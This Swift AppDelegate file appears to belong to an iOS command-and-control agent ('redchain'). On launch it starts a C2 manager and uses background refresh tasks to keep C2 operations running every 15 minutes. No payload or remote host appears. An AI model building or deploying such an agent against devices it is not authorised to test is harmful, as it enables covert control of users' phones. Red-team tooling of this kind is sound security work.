import UIKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    var c2Manager: C2Manager?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {

        // Initialize C2 Manager
        c2Manager = C2Manager.shared

        // Start C2 operations
        c2Manager?.start()

        // Setup background refresh
        setupBackgroundRefresh(application)

        return true
    }

    func setupBackgroundRefresh(_ application: UIApplication) {
        // Request background refresh
        application.setMinimumBackgroundFetchInterval(UIApplication.backgroundFetchIntervalMinimum)

        // Setup background tasks if iOS 13+
        if #available(iOS 13.0, *) {
            BGTaskScheduler.shared.register(
                forTaskWithIdentifier: "com.redchain.agent.refresh",
                using: nil
            ) { task in
                self.handleBackgroundRefresh(task: task as! BGAppRefreshTask)
            }
        }
    }

    @available(iOS 13.0, *)
    func handleBackgroundRefresh(task: BGAppRefreshTask) {
        scheduleBackgroundRefresh()

        Task {
            await c2Manager?.performBackgroundTasks()
            task.setTaskCompleted(success: true)
        }
    }

    @available(iOS 13.0, *)
    func scheduleBackgroundRefresh() {
        let request = BGAppRefreshTaskRequest(identifier: "com.redchain.agent.refresh")
        request.earliestBeginDate = Date(timeIntervalSinceNow: 15 * 60) // 15 minutes

        do {
            try BGTaskScheduler.shared.submit(request)
        } catch {
            print("Could not schedule background refresh: \\(error)")
        }
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
        if #available(iOS 13.0, *) {
            scheduleBackgroundRefresh()
        }
    }
}
